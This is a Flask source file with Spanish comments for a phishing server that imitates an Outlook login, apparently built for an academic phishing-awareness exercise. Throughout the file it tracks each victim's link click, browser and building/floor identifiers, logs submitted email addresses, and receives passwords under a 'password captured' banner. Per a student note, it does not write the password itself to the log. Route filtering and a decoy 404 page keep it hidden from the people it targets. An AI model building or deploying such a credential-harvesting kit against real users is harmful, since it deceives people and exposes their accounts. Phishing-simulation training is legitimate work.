from flask import Flask, render_template, request, abort
import datetime
import base64

# Inicialización de la aplicación Flask
app = Flask(__name__)

# Configuración de zona horaria (UTC-6 para Honduras, por ejemplo)
TIME_OFFSET = datetime.timedelta(hours=6)

def get_local_time():
    """
    Obtiene la hora local actual restando el offset configurado 
    para asegurar que los registros tengan la zona horaria correcta.
    """
    return datetime.datetime.now() - TIME_OFFSET

def is_number(s):
    """
    Valida si una cadena de texto contiene únicamente dígitos.
    Devuelve True si la cadena (s) es un entero no negativo (no se permiten ceros a la izquierda más allá de '0').
    """
    return s is not None and s.isdigit()

# Conjunto de parámetros permitidos en la URL por cuestiones de seguridad.
# Si se envía un parámetro distinto, la solicitud será denegada (Error 404).
ALLOWED_PARAMS = {'u', 'p', 'logo', 'bg', 'edificio', 'planta'}

@app.route('/email', methods=['POST'])
def log_email():
    """
    Ruta encargada de registrar (guardar) el correo electrónico 
    que ingresa la víctima en el paso 1 (antes de pedir la contraseña).
    """
    email = request.form.get('email')
    if email:
        timestamp = get_local_time().strftime('%Y-%m-%d %H:%M:%S')
        # Obtenemos el User-Agent para conocer el dispositivo y navegador que usa el usuario
        ua = request.headers.get('User-Agent')
        # Escribimos en el archivo log.txt (modo 'a' para agregar al final del archivo)
        with open("./static/log.txt", "a") as f:
            f.write("=" * 30 + "\n")
            f.write(f"!!! CORREO CAPTURADO [{timestamp}] !!!\n")
            f.write(f"Correo (Email): {email}\n")
            f.write(f"Navegador (User-Agent): {ua}\n")
            f.write("=" * 30 + "\n")
        return "Éxito", 200
    return "Falta el correo", 400

@app.route('/', methods=['GET', 'POST'])
def login():
    """
    Ruta principal del sistema. Maneja tanto la visita inicial de la víctima (GET) 
    como la captura final de los datos incluyendo la contraseña (POST).
    """
    if request.method == 'GET':
        # Verificación estricta: Si se recibe algún parámetro que no esté en nuestra lista de permitidos, rechazamos.
        received_params = set(request.args.keys())
        if not received_params.issubset(ALLOWED_PARAMS):
            abort(404)

        edificio = request.args.get('edificio')
        planta = request.args.get('planta')

        # Si vienen los parámetros edificio y planta, validamos que sean numéricos obligatoriamente.
        if edificio is not None and planta is not None:
            if not (is_number(edificio) and is_number(planta)):
                abort(404)  # Valores no numéricos se rechazan

            # Registramos la visita inicial del usuario (click en el enlace).
            timestamp = get_local_time().strftime('%Y-%m-%d %H:%M:%S')
            ua = request.headers.get('User-Agent')
            with open("./static/log.txt", "a") as f:
                f.write(f"- - - - - - - - - - - - - - - -\n")
                f.write(f"- Visita Inicial: {timestamp} -\n")
                f.write(f"- Navegador (User-Agent): {ua} -\n")
                f.write(f"- Edificio: {edificio} | Planta: {planta} -\n")
                f.write(f"- - - - - - - - - - - - - - - -\n")
        
        # Renderizamos la plantilla HTML principal (la simulación de Outlook)
        return render_template('login.html')

    if request.method == 'POST':
        # En una petición POST, se capturan las credenciales del usuario
        username = request.form.get('u')
        password = request.form.get('p')
        ua = request.headers.get('User-Agent')

        if username and password:
            timestamp = get_local_time().strftime('%Y-%m-%d %H:%M:%S')
            edificio = request.form.get('edificio')
            planta = request.form.get('planta')

            # Validación adicional por seguridad: si vienen estos datos, deben ser números.
            if edificio is not None or planta is not None:
                if not (is_number(edificio) and is_number(planta)):
                    return "El edificio y la planta deben ser numéricos", 400

            # Guardamos la captura final con la contraseña.
            with open("./static/log.txt", "a") as f:
                f.write("=" * 30 + "\n")
                f.write(f"!!! CONTRASEÑA CAPTURADA [{timestamp}] !!!\n")
                f.write(f"Correo (Email): {username}\n")
                # NOTA PARA EL ESTUDIANTE: En una prueba ética real (o por propósitos de anonimización), 
                # la contraseña no debería almacenarse en texto plano. Se puede ocultar u omitir.
                f.write(f"Navegador (User-Agent): {ua}\n")
                if edificio is not None and planta is not None:
                    f.write(f"Edificio: {edificio} | Planta: {planta}\n")
                f.write("=" * 30 + "\n")
            return "Éxito", 200

        return "Faltan datos", 400

    # Si por alguna razón no es GET ni POST, devolvemos 404
    abort(404)

@app.route('/ToS')
def tos():
    """
    Ruta para la página de Términos de Servicio (Terms of Service).
    Explica el propósito netamente académico del ejercicio para cumplir con 
    la transparencia y la ética en las pruebas.
    """
    return render_template('tos.html')

@app.errorhandler(404)
def page_not_found(e):
    """
    Manejador personalizado para los errores 404 (Página no encontrada).
    Sirve para evitar que la víctima descubra rutas o archivos sensibles.
    """
    return "<h1>404 Página No Encontrada</h1><p>La URL solicitada no se encontró en este servidor.</p>", 404

if __name__ == '__main__':
    # Ejecuta la aplicación de Flask en modo de desarrollo, disponible en todas las interfaces de red en el puerto 8081
    app.run(debug=True, host='0.0.0.0', port=8081)